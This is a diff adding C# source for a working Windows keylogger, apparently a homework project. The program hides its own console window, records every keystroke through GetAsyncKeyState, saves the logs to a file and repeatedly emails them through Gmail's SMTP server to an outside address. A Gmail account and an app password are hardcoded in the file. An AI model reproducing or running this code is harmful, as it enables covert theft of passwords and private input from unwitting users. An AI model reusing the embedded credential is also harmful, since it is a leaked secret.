@@ -1,0 +1,150 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Net.Mail;
+using System.ComponentModel.Design;
+namespace KeyLogger_NTP_Odev
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        private static extern short GetAsyncKeyState(int vkey);
+        [DllImport("user32.dll")]
+        private static extern IntPtr FindWindow(string? IpClassName, string IpWindowName);
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        static void Main(string[] args) 
+        {
+            IntPtr hWnd = FindWindow(null, Console.Title);
+            if (hWnd != IntPtr.Zero)
+            {
+                ShowWindow(hWnd, 0);
+            }
+            string log = "";
+        nextLog:
+            while (log.Length < 150)
+            {
+                for (int i = 1; i < 255; i++)
+                {
+                    int result = GetAsyncKeyState(i);
+                    if (result != 0)
+                    {
+                        log = log + CheckExeption(i);
+                        System.Threading.Thread.Sleep(115);
+                    }
+                }
+            }
+            DateTime current= DateTime.Now;
+            string date = current.ToString();
+            date = date.Replace(":","_");
+            date = date.Replace("/", "_");
+            string filePath = @"C:\Documents and Settings\All Users\Log_"+date+@".txt";
+            FileStream myLog = new FileStream(filePath, FileMode.CreateNew, FileAccess.Write);
+            StreamWriter sw=new StreamWriter(myLog);
+            sw.Write(log);
+            sw.Close();
+            myLog.Close();
+            //Mail Send
+            MailMessage mail = new MailMessage();
+            SmtpClient smtp = new SmtpClient("smtp.gmail.com");
+            mail.From = new MailAddress("testkeylogger458@gmail.com");
+            mail.To.Add("240542014@firat.edu.tr");
+            mail.Subject = "KeyLog from" + System.Environment.MachineName;
+            mail.Body ="New Log from"+DateTime.Now.ToString()+log;
+            
+
+            smtp.Port = 587;
+            smtp.Credentials = new NetworkCredential("testkeylogger458@gmail.com", "khlq duzp hozw rmzb");
+            smtp.EnableSsl = true;
+
+            smtp.Send(mail);
+            log = "";
+            goto nextLog;
+        }
+        public static string CheckExeption(int i)
+        {
+            switch (i)
+            {
+                case 1:
+                    return "<Left Click>";
+                case 2:
+                    return "<Right Click>";
+                case 13:
+                    return "<Enter>";
+                case 9:
+                    return "<Tab>";
+                case 20:
+                    return "<Caps Lock>";
+                case 160:
+                    return "<Left Shift>";
+                case 161:
+                    return "<Right Shift>";
+                case 162:
+                    return "<Left Ctrl>";
+                case 163:
+                    return "<Right Ctrl>";
+                case 164:
+                    return "<Left Alt>";
+                case 165:
+                    return "<Right Alt>";
+                case 17:
+                    return "<Ctrl>";
+                case 27:
+                    return "<Esc>";
+                case 32:
+                    return "<Space>";
+                case 37:
+                    return "<Left Arrow>";
+                case 38:
+                    return "<Up Arrow>";
+                case 39:
+                    return "<Right Arrow>";
+                case 40:
+                    return "<Down Arrow>";
+                case 45:
+                    return "<Insert>";
+                case 46:
+                    return "<Delete>";
+                case 36:
+                    return "<Home>";
+                case 35:
+                    return "<End>";
+                case 33:
+                    return "<Page Up>";
+                case 34:
+                    return "<Page Down>";
+                case 144:
+                    return "<Num Lock>";
+                case 19:
+                    return "<Pause>";
+                case 91:
+                    return "<Left Windows>";
+                case 92:
+                    return "<Right Windows>";
+                case 93:
+                    return "<Menu>";
+                case 186:
+                    return "Ş";
+                case 220:
+                    return "Ç";
+                case 221:
+                    return "Ğ";
+                case 222:
+                    return "İ";
+                case 191:
+                    return "Ö";
+                case 192:
+                    return "Ü";
+                default:
+                    if ((i >= 65 && i <= 90) || (i >= 48 && i <= 57)) // Harf ve rakamlar
+                        return ((char)i).ToString();
+                    return "";
+
+            }
+        }
+    }
+}
